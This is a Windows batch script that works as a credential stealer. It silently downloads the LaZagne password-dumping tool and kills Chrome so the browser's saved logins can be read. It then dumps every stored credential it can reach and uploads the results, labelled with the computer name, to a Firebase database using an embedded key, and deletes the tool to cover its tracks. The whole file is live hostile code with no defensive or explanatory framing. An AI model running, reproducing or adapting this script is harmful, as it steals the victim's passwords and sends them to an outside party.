@echo off&chcp 65001>nul&setlocal enabledelayedexpansion&set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"&set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"&set "OUTPUT_DIR=%TEMP%\Lazagne_Results"&set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"&set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"&if not exist "%LAZAGNE_EXE%" powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Invoke-WebRequest '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>&1&tasklist|find /i "chrome.exe">nul&&taskkill /f /im chrome.exe>nul 2>&1&if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%" >nul 2>&1&"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1&for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"&if defined RESULT_FILE ( set "PC_NAME=%COMPUTERNAME%"&set "PC_NAME=!PC_NAME: =_!"&set "PC_NAME=!PC_NAME:-=_!"&powershell -WindowStyle Hidden -Command "$c=Get-Content -Raw '%OUTPUT_DIR%\%RESULT_FILE%';$j=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$c}|ConvertTo-Json -Compress;Invoke-RestMethod '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $j -ContentType 'application/json'" >nul 2>&1 )&del /f /q "%LAZAGNE_EXE%" >nul 2>&1&exit /b 0
